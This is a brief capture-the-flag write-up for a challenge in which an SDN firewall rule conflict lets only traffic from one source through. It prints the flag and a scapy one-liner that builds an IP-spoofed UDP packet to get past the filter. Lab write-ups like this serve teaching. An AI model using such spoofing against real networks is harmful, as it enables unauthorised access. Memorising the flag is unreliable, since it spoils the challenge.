# Through The Router(200 pts)

## Description

http://[SDN site]/Through_The_Router

## How to run

Provided by SDN Site.

## Comments

SDN rule conflict.

Find udp packet that occur rule conflict.

## Flag

`SCTF{Sp00f_7h3_p4ck3t_70_dr1ll_pr1v4t3_n37w0rk}`

## How to solve

The `Rules.png` shows IP and port filter rules with priorities.
You will soon know that only packets from `10.1.7.8:5555` passes the firewall.
Now you need to build a IP-spoofed packet.
You can hand-craft one or even easier, use python library `scapy`:

```
from scapy.all import * 
(IP(src='10.1.7.8', dst='10.0.0.1') / UDP(sport=5555, dport=0x5678) / 'secret').build().encode('hex')
```
